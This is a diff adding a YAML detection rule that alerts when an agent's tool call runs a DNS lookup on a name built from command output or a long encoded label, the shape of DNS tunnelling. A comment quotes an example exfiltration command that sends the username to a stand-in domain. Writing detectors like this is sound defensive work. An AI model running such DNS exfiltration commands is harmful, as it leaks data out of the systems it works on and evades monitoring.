@@ -1,0 +1,17 @@
+# DNS is the egress channel that survives when HTTP is blocked or proxied, and
+# the tell is that the queried name is data rather than a hostname: either
+# built from command substitution (dig $(whoami).exfil.tld) or carrying a 40+
+# character encoded label. Requiring whitespace after the resolver name means
+# a JSON argument like {"host": "db.internal"} cannot trigger it, and
+# requiring the substitution to appear after the resolver keeps loops like
+# `for d in $(cat domains.txt); do dig $d; done` clean.
+id: aileron-133
+title: DNS lookup of a hostname built from command output or a long encoded label
+severity: high
+match:
+  type: tool_call
+  # A resolver invoked on a name that is computed at call time - $(...) or a
+  # 40+ character label - is the shape of DNS tunnelling. Looking up a literal
+  # or a plain $VAR hostname does not match.
+  tool.arguments_regex: '(?i)\b(dig|nslookup|drill|dnsx|host)\s[^\n]{0,120}(\$\(|`|[A-Za-z0-9+/=_-]{40,}\.)'
+action: alert
